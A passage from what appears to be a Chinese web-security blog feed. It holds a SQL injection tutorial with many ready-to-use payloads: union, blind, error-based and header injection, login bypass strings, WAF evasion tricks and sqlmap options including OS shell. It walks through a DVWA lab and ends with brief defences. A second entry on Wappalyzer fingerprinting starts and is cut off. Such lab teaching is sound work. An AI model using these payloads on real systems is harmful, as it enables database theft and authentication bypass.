<p>在url中一般使用<code>--+</code>进行注释，其他情况采用<code>#</code>为主</p>
</blockquote>
<h3 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h3><ul>
<li><code>1&#39; order by 1--+</code> 判断字段数（by后接的常数表示按第几列进行排序）</li>
<li><code>1&#39; union select 1,2,3--+</code> 查看字段回显位置</li>
<li><code>-1&#39; union select 1,2,3</code>–+让第一个结果集为空</li>
</ul>
<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p><code>information_schema表是在sql5.0版本之后才有的</code></p>
<p><strong>查库</strong></p>
<p><code>-1&#39; union select 1,2,schema_name from information_schema.schemata--+</code></p>
<p>数据库太多可以使用group_concat函数分割</p>
<p><code>-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p>
<p><strong>查表</strong></p>
<p><code>-1&#39; union select 1,2,table_name from information_schema.tables where table_schema=&quot;&lt;数据库名&gt;&quot;--+</code></p>
<p><strong>查字段</strong></p>
<p><code>-1&#39; union select 1,2,column_name from information_schema.columns where table_name=&quot;&lt;表名&gt;&quot;--+</code></p>
<p><strong>查数据</strong></p>
<p><code>-1&#39; union select 1,username,password from &lt;表名&gt;--+</code></p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p><code>limit和substr的参数需要不断调整的</code></p>
<p><strong>函数</strong></p>
<ul>
<li>substr(string,start,length)；<ul>
<li>string为字符串；</li>
<li>start为字符串起始截取位置（从1开始）；</li>
<li>length为字符串长度</li>
</ul>
</li>
<li>ascii()函数<ul>
<li>将字符串中最左边字符转换为相对应的ASCII代码值。</li>
</ul>
</li>
<li>length()函数<ul>
<li>返回字符串的长度</li>
</ul>
</li>
<li>sleep()函数<ul>
<li>sleep(n)函数可以让数据库执行语句”停留”n秒时间，成功执行会返回0。而如果执行过程中断会返回1</li>
</ul>
</li>
<li>if()函数<ul>
<li>if(表达式1,表达式2,表达式3)当表达式１是true，则会返回表达式２；否则返回表达式３。</li>
</ul>
</li>
<li>limit n,m<ul>
<li>从第n个开始查询m个（从0开始）</li>
</ul>
</li>
</ul>
<h4 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h4><p><strong>猜库</strong></p>
<ul>
<li>长度</li>
</ul>
<p><code>1&#39; and (length(database()))&lt;10--+</code></p>
<ul>
<li>名称</li>
</ul>
<p><code>1&#39; and (ascii(substr(database(),1,1)))&gt;100--+</code></p>
<p><strong>猜表</strong></p>
<ul>
<li><p>数量</p>
<p><code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=4--+</code></p>
</li>
<li><p>长度<br><code>1&#39; and(length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&lt;10--+</code></p>
</li>
<li><p>名称<br><code>1&#39; and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;116--+</code></p>
</li>
</ul>
<p><strong>猜字段</strong></p>
<ul>
<li><p>数量</p>
<p><code>1&#39; and (select count(column_name) from information_schema.columns where table_name=&quot;表名&quot;)=3--+</code></p>
</li>
<li><p>长度<br><code>1&#39; and (length((select column_name from information_schema.columns where table_name=&quot;表名&quot; limit 0,1)))&gt;10--+</code></p>
</li>
<li><p>名称<br><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&quot;表名&quot; limit 0,1),1,1)))&gt;100--+</code></p>
</li>
</ul>
<p><strong>猜数据</strong></p>
<ul>
<li><p>长度</p>
<p><code>1&#39; and (length(( select 字段 from 表名 limit 0,1)))=6--+</code></p>
</li>
<li><p>内容</p>
<p><code>1&#39; and (ascii(substr(( select 字段 from 表名 limit 0,1),1,1)))=68--+</code></p>
</li>
</ul>
<h4 id="时间类型"><a href="#时间类型" class="headerlink" title="时间类型"></a>时间类型</h4><p><strong>判断注入点</strong></p>
<p><code>1’ and if(1=0,1, sleep(5))--+</code></p>
<p><strong>猜库</strong></p>
<ul>
<li><p>长度</p>
<p><code>1&#39; and if(length(database())=8,sleep(5),1)--+</code></p>
</li>
<li><p>名称</p>
<p><code>1&#39; and If(ascii(substr(database(),0,1))=115,sleep(5),1)--+</code></p>
</li>
</ul>
<p><strong>猜表</strong></p>
<ul>
<li><p>数量</p>
<p><code>1&#39; and if((select count(table_name）from information_schema.tables where table_schema=database())=4,sleep(5),1)--+</code></p>
</li>
<li><p>长度</p>
<p><code>1&#39; and if(length((select table_name from
information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1)--+</code></p>
</li>
<li><p>名称</p>
<p><code>1&#39; and If(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117,sleep(5),1)--+</code></p>
</li>
</ul>
<p><strong>猜字段</strong></p>
<ul>
<li><p>数量</p>
<p><code>1&#39; and if((select count(column_name) from information_schema.columns where table_name=&quot;表名&quot;)=3,sleep(4),1)--+</code></p>
</li>
<li><p>长度</p>
<p><code>1&#39; and if(length((select column_name from information_schema.columns where table_name=&quot;表名&quot; limit 0,1))=４,sleep(5),1)--+</code></p>
</li>
<li><p>名称</p>
<p><code>1&#39; and if(ascii(substr((select columnname from informationschema.columns where  table_name=&quot;表名&quot; limit 0,1),1,1))=117,sleep(5),1)--+</code></p>
</li>
</ul>
<p><strong>猜数据</strong></p>
<ul>
<li><p>长度</p>
<p><code>1&#39; and if(length((select 字段 from 表名 limit 0,1))=5,sleep(5),1)--+</code></p>
</li>
<li><p>内容</p>
<p><code>1&#39; and if(ascii(substr(( select 字段 from 表名 limit 0,1),1,1))=68,sleep(5),1)--+</code></p>
</li>
</ul>
<h4 id="报错类型"><a href="#报错类型" class="headerlink" title="报错类型"></a>报错类型</h4><p><code>适用于没有过滤掉报错信息，能够回显</code></p>
<ul>
<li><p>对xml进行查修和修改报错</p>
<ul>
<li>payload: <code>1’ and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+</code></li>
<li>payload：<code>1&#39; and (extractvalue(1,concat(0×7e,(select version()),0×7e)))--+</code></li>
</ul>
</li>
<li><p>exp()函数(mysql&gt;5.5.5)</p>
<ul>
<li>payload:<code>1&#39; and (EXP(~(select * from(select version())a)))--+</code></li>
</ul>
</li>
<li><p>数据重复报错</p>
<ul>
<li>payload:<code>1&#39; and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+</code></li>
</ul>
</li>
<li><p>floor函数(取整)报错</p>
<ul>
<li>payload:<code>1&#39; and (select 1 from(select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a)--+</code></li>
</ul>
</li>
<li><p>其他报错payload</p>
<ul>
<li>GeometryCollection()<ul>
<li><code>id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))</code></li>
</ul>
</li>
<li>polygon()<ul>
<li><code>id =1 AND polygon((select * from(select * from(select user())a)b))</code></li>
</ul>
</li>
<li>multipoint()<ul>
<li><code>id = 1 AND multipoint((select * from(select * from(select user())a)b))</code></li>
</ul>
</li>
<li>multilinestring()<ul>
<li><code>id = 1 AND multilinestring((select * from(select * from(select user())a)b))</code></li>
</ul>
</li>
<li>linestring()<ul>
<li><code>id = 1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li>
</ul>
</li>
<li>multipolygon()<ul>
<li><code>id =1 AND multipolygon((select * from(select * from(select user())a)b))</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><h4 id="绕过密码认证"><a href="#绕过密码认证" class="headerlink" title="绕过密码认证"></a>绕过密码认证</h4><ul>
<li><p>admin’# </p>
</li>
<li><p>admin or’1’=’1# </p>
</li>
<li><p>admin’ and 1=1# </p>
</li>
<li><p>admin’ or 1=1#</p>
</li>
<li><p>‘or 1=1#</p>
</li>
</ul>
<h4 id="修改数据包"><a href="#修改数据包" class="headerlink" title="修改数据包"></a>修改数据包</h4><ul>
<li><p>测试注入点</p>
<p><code>name=admin&#39; and 1=1#&amp;passwd=admin&amp;submit=Submit</code></p>
</li>
<li><p>判断字段数</p>
<p><code>name=admin&#39; order by 3#&amp;passwd=admin&amp;submit=Submit</code> </p>
</li>
<li><p>查库</p>
<p><code>name=-1&#39; union select 1,database()#&amp;passwd=admin&amp;submit=Submit</code></p>
</li>
<li><p>查表</p>
<p><code>name=-1&#39; union select 1,table_name from information_schema.tables where table_schema=database()#&amp;passwd=admin&amp;submit=Submit</code></p>
</li>
<li><p>查字段</p>
<p><code>name=-1&#39; union select 1,column_name from information_schema.columns where table_name=表名#&amp;passwd=admin&amp;submit=Submit</code></p>
</li>
<li><p>查数据</p>
<p><code>name=-1&#39; union select 字段1,字段2 from 表名#&amp;passwd=admin&amp;submit=Submit</code></p>
</li>
</ul>
<blockquote>
<p>get请求的其他注入方式在post同样适用</p>
</blockquote>
<h3 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h3><h4 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h4><ul>
<li>在cookie处可以插入admin’ and 1=1#测试有没有注入点</li>
<li>如果存在注入点，get注入语句同样适用</li>
<li><code>name=admin&#39; and (extractvalue(1,concat(0x7e,(select @@version),0x7e)))#</code></li>
</ul>
<h4 id="User-Agent注入"><a href="#User-Agent注入" class="headerlink" title="User-Agent注入"></a>User-Agent注入</h4><ul>
<li>在数据包User-Agent中修改数据包</li>
<li><code>User-Agent:&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39;=&#39;1</code></li>
<li>如需要查询其他修改查询语句就好</li>
</ul>
<h4 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h4><ul>
<li>在数据包Referer处修改 </li>
<li><code>&#39;andextractvalue(1,concat(0x7e, (select@@basedir),0x7e))and&#39;1&#39;=&#39;1</code></li>
</ul>
<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>payload：<code>1&#39; uniON sEleCt 1,2,3--+</code></p>
<h4 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h4><p>payload：<code>1&#39;+UNIunionON+SeLselectECT1,2,3–-+</code></p>
<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p><code>可以多种混合使用</code></p>
<ul>
<li>十六进制绕过</li>
<li>ascii编码绕过</li>
<li>url编码绕过</li>
<li>unicode编码绕过</li>
</ul>
<h4 id="关键字替换绕过"><a href="#关键字替换绕过" class="headerlink" title="关键字替换绕过"></a>关键字替换绕过</h4><ul>
<li>and=&amp;&amp;</li>
<li>or=||</li>
</ul>
<h4 id="函数替换绕过"><a href="#函数替换绕过" class="headerlink" title="函数替换绕过"></a>函数替换绕过</h4><ul>
<li>sleep() ==&gt;benchmark()</li>
<li>concatws()==&gt;groupconcat()</li>
<li>substr()==&gt;substring()</li>
<li>@@datadir==&gt;datadir() </li>
<li>@@user==&gt;user()</li>
</ul>
<h4 id="空白符绕过"><a href="#空白符绕过" class="headerlink" title="空白符绕过"></a>空白符绕过</h4><ul>
<li><code>%250C</code></li>
<li><code>%25A0</code></li>
<li><code>%20、%09、%0a、%0b、%0c、%0d、%a0、%00、/**/  /*!*/</code></li>
</ul>
<h2 id="工具简单使用"><a href="#工具简单使用" class="headerlink" title="工具简单使用"></a>工具简单使用</h2><p><strong>SQLMAP回显内容设置</strong></p>
<p><code>sqlmap -u url –v [args]此参数共有七个等级，默认等级为一级</code></p>
<ul>
<li><p>0 只显示python错误以及严重信息</p>
</li>
<li><p>1 同时显示基本信息和警告信息（默认）</p>
</li>
<li><p>2 同时显示debug信息</p>
</li>
<li><p>3 同时显示注入的payload</p>
</li>
<li><p>4 同时显示HTTP请求</p>
</li>
<li><p>5 同时显示HTTP响应头</p>
</li>
<li><p>6 同时显示HTTP相应页面</p>
</li>
</ul>
<p><strong>SQLMAP简单应用</strong></p>
<ul>
<li>基本注入<ul>
<li><code>-u URL</code>：通过URL扫描是否存在注入点<ul>
<li><code>sqlmap -u url</code></li>
</ul>
</li>
<li><code>--dbs</code>：查看全部数据库</li>
<li><code>-b</code>：查看数据库版本</li>
<li><code>--current-db</code>：查看当前数据库</li>
<li><code>--current-user</code>：查看当前用户</li>
<li><code>--is-dba</code>：判断是否为管理员</li>
<li><code>--tables -D 数据库</code>：查看指定数据库中的表</li>
<li><code>--columns -T 表名 -D 数据库</code>：查看指定表中的字段</li>
<li><code>--dump -C 列名 -T 表名 -D 数据库</code>：查看指定列名数据</li>
</ul>
</li>
<li>其他可选项<ul>
<li><code>--tamper=TAMPER</code>：绕过waf</li>
<li><code>–os-cmd=&quot;OSCMD&quot;</code>：执行cmd命令</li>
<li><code>–os-shell</code>：系统交互shell</li>
<li><code>--risk=RISK</code>：risk越高，越慢但是越安全【0-3】</li>
<li><code>--threads 10</code>：线程最高为10</li>
<li><code>--help</code> ：命令帮助</li>
<li><code>--cookie=COOKIE</code>：cookie注入</li>
<li>POST注入<ul>
<li><code>--data 参数</code>指定参数</li>
<li><code>--forms</code>自动判断注入</li>
<li><code>-r txt文件 -p 参数</code>从bp导出数据包txt</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="靶场训练-DVWA"><a href="#靶场训练-DVWA" class="headerlink" title="靶场训练(DVWA)"></a>靶场训练(DVWA)</h2><h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><h5 id="low"><a href="#low" class="headerlink" title="low"></a>low</h5><p>(1)判断注入点</p>
<blockquote>
<p>输入1，正常回显；输入1’报错，说明有注入点</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597150763322.png" alt="1597150763322" title class>
                <p>1597150763322</p>
            </figure>

<p>（2）判断字段数</p>
<blockquote>
<p>输入1’ order by 1#正常;输入1’ order by 1,2#正常;输入1’ order by 1,2,3#报错，说明字段数为2</p>
</blockquote>
<p><code>1&#39; order 1#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597151437412.png" alt="1597151437412" title class>
                <p>1597151437412</p>
            </figure>

<p>（3）查看回显位置，并进行union注入查询</p>
<blockquote>
<p>设置为-1是为了让前面子集为空</p>
</blockquote>
<p><code>-1&#39; union select 1,2#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597151782271.png" alt="1597151508527" title class>
                <p>1597151508527</p>
            </figure>

<blockquote>
<p>查看数据库，和版本</p>
</blockquote>
<p><code>-1&#39; union select database(),version()#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597151508527.png" alt="1597151782271" title class>
                <p>1597151782271</p>
            </figure>

<blockquote>
<p>查看数据库,并让它在2的位置回显</p>
</blockquote>
<p><code>-1&#39; union select 1,schema_name from information_schema.schemata#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597152579142.png" alt="1597152579142" title class>
                <p>1597152579142</p>
            </figure>

<blockquote>
<p>查看dvwa表，并回显在2</p>
</blockquote>
<p><code>-1&#39; union select 1,table_name from information_schema.tables where table_schema=&quot;dvwa&quot;#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597154167541.png" alt="1597153650280" title class>
                <p>1597153650280</p>
            </figure>

<blockquote>
<p>查看表中的字段，回显在2</p>
</blockquote>
<p><code>-1&#39; union select 1,column_name from information_schema.columns where table_name=&quot;users&quot;#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597153650280.png" alt="1597153814658" title class>
                <p>1597153814658</p>
            </figure>

<blockquote>
<p>查看user和password字段的内容</p>
</blockquote>
<p><code>-1&#39; union select user,password from users#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597153814658.png" alt="1597154167541" title class>
                <p>1597154167541</p>
            </figure>

<h5 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h5><blockquote>
<p>这里限制了输入，我们需要抓包进行修改</p>
</blockquote>
<p> <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597157686281.png" alt="1597157686281"></p>
<blockquote>
<p>和前面一样尝试我们发现，但这里是整数型不需要闭合，其余都和前面都一样，所以查看数据的具体步骤就省略了</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597158059688.png" alt="1597157823757" title class>
                <p>1597157823757</p>
            </figure>

<h5 id="High"><a href="#High" class="headerlink" title="High"></a>High</h5><blockquote>
<p>这里跳转到另外一个界面输入信息，防止了自动化SQL注入，但是方法依旧和(LOW)级别一样，只是换了个位置输入，过程就不演示啦。</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597158559411.png" alt="1597158059688" title class>
                <p>1597158059688</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597158084811.png" alt="1597158084811" title class>
                <p>1597158084811</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597160077983.png" alt="1597158559411" title class>
                <p>1597158559411</p>
            </figure>

<h4 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h4><h5 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h5><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597160098860.png" alt="1597160077983" title class>
                <p>1597160077983</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597161192485.png" alt="1597160098860" title class>
                <p>1597160098860</p>
            </figure>

<blockquote>
<p>通过输入发现，这个输入框只会根据输入的内容是否存在数据库中，返回两种结果，所以只能使用盲注，通过测试发现需要<code>&#39;</code>进行闭合，这里采用布尔盲注方式进行测试数据库长度，时间盲注同样可以。</p>
</blockquote>
<p><code>1&#39; and (length(database()))&lt;4#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597157823757.png" alt="1597161173004" title class>
                <p>1597161173004</p>
            </figure>

<p><code>1&#39; and (length(database()))&lt;5#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597162589046.png" alt="1597161192485" title class>
                <p>1597161192485</p>
            </figure>

<blockquote>
<p>发现长度4和5结果不同，可以确认数据库长度为4，然后开始猜名称</p>
</blockquote>
<p><code>1&#39; and (ascii(substr(database(),1,1)))&gt;100#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597161173004.png" alt="1597161443050" title class>
                <p>1597161443050</p>
            </figure>

<p><code>1&#39; and (ascii(substr(database(),1,1)))&gt;99#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597162575060.png" alt="1597161459673" title class>
                <p>1597161459673</p>
            </figure>

<blockquote>
<p>通过查询发现大于99但是不大于100，发现是100，100对应的ASCII为d，同样方法依次测出后面三位，发现数据库名称为dvwa,接下来开始查表</p>
</blockquote>
<p><code>1&#39; and(length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&lt;10#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597162862636.png" alt="1597162575060" title class>
                <p>1597162575060</p>
            </figure>

<p><code>1&#39; and(length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&lt;9#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597161443050.png" alt="1597162589046" title class>
                <p>1597162589046</p>
            </figure>

<blockquote>
<p>不小于9，小于10可以判断长度为9，然后开始猜名称</p>
</blockquote>
<p><code>1&#39; and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;103#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597162797589.png" alt="1597162797589" title class>
                <p>1597162797589</p>
            </figure>

<p><code>1&#39; and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;104#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597163115723.png" alt="1597162862636" title class>
                <p>1597162862636</p>
            </figure>

<blockquote>
<p>小于103，不小于104，所以是103，对应的ASCII为g，同样方法猜到后面结果为guestbook。然后开始猜字段，这里猜第三个字段</p>
</blockquote>
<p><code>1&#39; and (length((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1)))&lt;5#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597163275391.png" alt="1597163115723" title class>
                <p>1597163115723</p>
            </figure>

<p><code>1&#39; and (length((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1)))&lt;4#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597163128591.png" alt="1597163128591" title class>
                <p>1597163128591</p>
            </figure>

<blockquote>
<p>小于5不小于4，所以结果是长度是4，然后猜名称</p>
</blockquote>
<p><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1),1,1)))&gt;110#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597163675016.png" alt="1597163275391" title class>
                <p>1597163275391</p>
            </figure>

<p><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1),1,1)))&gt;109#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597161459673.png" alt="1597163530646" title class>
                <p>1597163530646</p>
            </figure>

<blockquote>
<p>大于109，不大于110，所以是110对应n，依次重复猜到为name，然后开始猜内容长度,这里用=猜</p>
</blockquote>
<p><code>1&#39; and (length(( select name from guestbook limit 0,1)))=4#</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597163530646.png" alt="1597163675016" title class>
                <p>1597163675016</p>
            </figure>

<blockquote>
<p>猜到4为正确的，所以长度为4，然后猜具体内容</p>
</blockquote>
<p><code>1&#39; and (ascii(substr(( select name from guestbook limit 0,1),1,1)))=116#</code></p>
<p><code>1&#39; and (ascii(substr(( select name from guestbook limit 0,1),2,1)))=101#</code></p>
<p><code>1&#39; and (ascii(substr(( select name from guestbook limit 0,1),3,1)))=115#</code></p>
<p><code>1&#39; and (ascii(substr(( select name from guestbook limit 0,1),4,1)))=116#</code></p>
<blockquote>
<p>最终猜到guestbook表中的name字段，第一个内容为test</p>
</blockquote>
<h5 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h5><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597162058638.png" alt="1597162058638" title class>
                <p>1597162058638</p>
            </figure>

<blockquote>
<p>和low注入一样，只不过需要抓包进行数据修改，参数是整数型，不需要闭合，其余不变</p>
</blockquote>
<h5 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h5><blockquote>
<p>和前面一样的作用，只是为了防止自动化SQL注入</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597162129663.png" alt="1597162129663" title class>
                <p>1597162129663</p>
            </figure>

<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
<li>对用户的输入进行校验通过正则表达式，限制输入长度，对单引号和 双引号等进行转换</li>
<li>机密信息不要明文存放，采用机密处理</li>
<li>封装处理异常信息</li>
<li>不要动态拼接sql语句</li>
<li>合理设置数据库用户的权限</li>
</ol>
<hr>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[基于wappalyzer编写指纹]]></title>
      <url>/2021/01/15/wappalyzer/</url>
      <content type="html"><![CDATA[<h1 id="基于wappalyzer编写指纹"><a href="#基于wappalyzer编写指纹" class="headerlink" title="基于wappalyzer编写指纹"></a>基于wappalyzer编写指纹</h1><h2 id="node-js安装"><a href="#node-js安装" class="headerlink" title="node.js安装"></a>node.js安装</h2><p>下载地址:<code>http://nodejs.cn/download/</code></p>
<p>安装完后CMD中使用：node -v 验证是否成功</p>
<h2 id="wappalyzer安装"><a href="#wappalyzer安装" class="headerlink" title="wappalyzer安装"></a>wappalyzer安装</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -g wappalyzer</span><br></pre></td></tr></table></figure>

<p>因为node.js模块安装在<code>C:\Users\Administrator\AppData\Roaming\npm\node_modules</code>目录下，在该目录下我们可以找到<code>wappalyzer</code></p>
<h2 id="wappalyzer原理与基本使用"><a href="#wappalyzer原理与基本使用" class="headerlink" title="wappalyzer原理与基本使用"></a>wappalyzer原理与基本使用</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Wappalyzer通过给指定URI发送HTTP请求，通过获得的响应头和响应头来识别单个URL的指纹。</p>
<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>以查询百度指纹为例</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wappalyzer https://www.baidu.com/</span><br></pre></td></tr></table></figure>

<p>返回结果如下</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"urls"</span>:&#123;<span class="attr">"https://www.baidu.com/"</span>:&#123;<span class="attr">"status"</span>:<span class="number">200</span>&#125;&#125;,<span class="attr">"technologies"</span>:[&#123;<span class="attr">"slug"</span>:<span class="string">"swfobject"</span>,<span class="attr">"name"</span>:<span class="string">"SWFObject"</span>,<span class="attr">"confidence"</span>:<span class="number">100</span>,<span class="attr">"version"</span>:<span class="literal">null</span>,<span class="attr">"icon"</span>:<span class="string">"SWFObject.png"</span>,<span class="attr">"website"</span>:<span class="string">"https://github.com/swfobject/swfobject"</span>,<span class="attr">"cpe"</span>:<span class="literal">null</span>,<span class="attr">"categories"</span>:[&#123;<span class="attr">"id"</span>:<span class="number">19</span>,<span class="attr">"slug"</span>:<span class="string">"miscellaneous"</span>,<span class="attr">"name"</span>:<span class="string">"Miscellaneous"</span>&#125;]&#125;,&#123;<span class="attr">"slug"</span>:<span class="string">"jquery"</span>,<span class="attr">"name"</span>:<span class="string">"jQuery"</span>,<span class="attr">"confidence"</span>:<span class="number">100</span>,<span class="attr">"version"</span>:<span class="string">"1.10.2"</span>,<span class="attr">"icon"</span>:<span class="string">"jQuery.svg"</span>,<span class="attr">"website"</span>:<span class="string">"https://jquery.com"</span>,<span class="attr">"cpe"</span>:<span class="string">"cpe:/a:jquery:jquery"</span>,<span class="attr">"categories"</span>:[&#123;<span class="attr">"id"</span>:<span class="number">59</span>,<span class="attr">"slug"</span>:<span class="string">"javascript-libraries"</span>,<span class="attr">"name"</span>:<span class="string">"JavaScript libraries"</span>&#125;]&#125;]&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210110212723083.png" alt="image-20210108224909184" title class>
                <p>image-20210108224909184</p>
            </figure>

<h2 id="指纹识别应用"><a href="#指纹识别应用" class="headerlink" title="指纹识别应用"></a>指纹识别应用</h2><h3 id="基于Wappalyzer的指纹识别分类"><a href="#基于Wappalyzer的指纹识别分类" class="headerlink" title="基于Wappalyzer的指纹识别分类"></a>基于Wappalyzer的指纹识别分类</h3><table>
<thead>
<tr>
<th><strong>分类编号</strong></th>
<th><strong>分类名称</strong></th>
<th><strong>中文名称</strong></th>
<th><strong>备注说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>CMS</td>
<td>内容管理系统</td>
<td>例如：wordpress</td>
</tr>
<tr>
<td>2</td>
<td>Message Boards</td>
<td>留言板</td>
<td>例如：phpBB</td>
</tr>
<tr>
<td>3</td>
<td>Database Managers</td>
<td>数据库管理</td>
<td>例如：phpMyAdmin</td>
</tr>
<tr>
<td>4</td>
<td>Documentation Tools</td>
<td>文件工具</td>
<td>例如：GitBook</td>
</tr>
<tr>
<td>5</td>
<td>Widgets</td>
<td>窗口小部件</td>
<td>例如：Facebook</td>
</tr>
<tr>
<td>6</td>
<td>Ecommerce</td>
<td>电子商务</td>
<td>例如：Wikinggruppen</td>
</tr>
<tr>
<td>7</td>
<td>Photo Galleries</td>
<td>照片画廊</td>
<td>例如：phpAlbum</td>
</tr>
<tr>
<td>8</td>
<td>Wikis</td>
<td>维基百科</td>
<td>例如：ikiwiki</td>
</tr>
<tr>
<td>9</td>
<td>Hosting Panels</td>
<td>主机控制板</td>
<td>例如：cPanel</td>
</tr>
<tr>
